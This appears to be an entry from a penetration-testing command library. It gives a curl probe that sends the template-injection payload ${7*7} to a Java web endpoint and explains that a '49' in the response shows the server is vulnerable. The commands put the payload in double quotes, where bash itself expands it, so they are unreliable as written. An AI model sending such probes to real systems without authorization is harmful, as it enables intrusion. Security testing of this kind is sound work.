---
id: 64de1461-7391-4e69-9dd8-70d958f29593
name: test-java-ssti-arithmetic-7-times-7
type: command
executor: bash
data: 'curl "$_TARGET_URL?template=${7*7}"'
output: null
created_at: '2023-04-06T03:56:39.297342+00:00'
updated_at: '2024-01-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - ssti
  - java
  - test
verified: true
validated: true
---

# test-java-ssti-arithmetic-7-times-7

## Command

```bash
curl "$_TARGET_URL?template=${7*7}"
```

## Description

Sends an HTTP GET request to a vulnerable Java template endpoint with a basic arithmetic EL payload to test for SSTI. The response should evaluate the expression if vulnerable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the vulnerable endpoint (e.g., http://target.com/render) | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/render?template=${7*7}"
```

### Advanced Usage (POST)

```bash
curl -X POST "$_TARGET_URL" -d "template=${7*7}"
```

## Expected Output

The HTTP response body contains '49' embedded in the rendered template, confirming EL evaluation (e.g., '<h1>Result: 49</h1>'). If the literal '${7*7}' appears, no SSTI.

## Related

- [[procedures/Java-SSTI-Basic-Injection-Using-ClassLoader-and-Resource-Retrieval]]
